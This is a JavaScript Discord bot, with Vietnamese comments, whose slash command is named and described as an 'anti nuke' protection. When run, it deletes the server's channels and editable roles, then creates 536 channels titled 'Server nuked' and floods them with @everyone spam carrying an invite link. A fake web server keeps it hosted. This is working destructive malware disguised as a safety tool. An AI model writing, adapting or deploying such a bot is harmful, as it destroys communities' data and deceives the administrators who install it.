import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);
/* =========================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

const sleep = ms => new Promise(r => setTimeout(r, ms));

/* ===== CONFIG ===== */
const CHANNEL_NAME = "Server nuked";
const CREATE_COUNT = 536;
const MSG_COUNT_MIN = 4;
const MSG_COUNT_MAX = 5;
const DELAY = 109;
/* ================== */

/* ===== Slash Command ===== */
const commands = [
  new SlashCommandBuilder()
    .setName("antinuke")
    .setDescription("Bật anti nuke")
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  try {
    console.log("🔁 Đăng slash command...");
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log("✅ Xong!");
  } catch (e) {
    console.error(e);
  }
})();
/* ========================= */

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag}`);
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "antinuke") return;

  const guild = interaction.guild;

  await interaction.reply({
    content: "⚠️ Chuẩn Bị...",
    ephemeral: true
  });

  /* ===== XOÁ CHANNEL ===== */
  for (const ch of [...guild.channels.cache.values()]) {
    try {
      await ch.delete();
      await sleep(DELAY);
    } catch {}
  }

  /* ===== XOÁ ROLE ===== */
  const botRolePos = guild.members.me.roles.highest.position;
  const roles = [...guild.roles.cache.values()]
    .filter(r => r.editable && r.name !== "@everyone" && r.position < botRolePos);

  for (const role of roles) {
    try {
      await role.delete();
      await sleep(DELAY);
    } catch {}
  }

  await interaction.followUp({
    content: "⚡ Sắp xong...😂",
    ephemeral: true
  });

  /* ===== TẠO KÊNH + GỬI TIN ===== */
  for (let i = 0; i < CREATE_COUNT; i++) {
    try {
      const ch = await guild.channels.create({
        name: CHANNEL_NAME,
        type: ChannelType.GuildText
      });

      const msgCount =
        Math.floor(Math.random() * (MSG_COUNT_MAX - MSG_COUNT_MIN + 1)) +
        MSG_COUNT_MIN;

      for (let j = 0; j < msgCount; j++) {
        await ch.send("@everyone 🚀Join: https://discord.gg/P9yeTvwKjB");
        await sleep(100);
      }

      await sleep(DELAY);
    } catch {}
  }

  await interaction.followUp({
    content: "✅ Hoàn tất Antinuke.",
    ephemeral: true
  });
});

client.login(process.env.BOT_TOKEN);
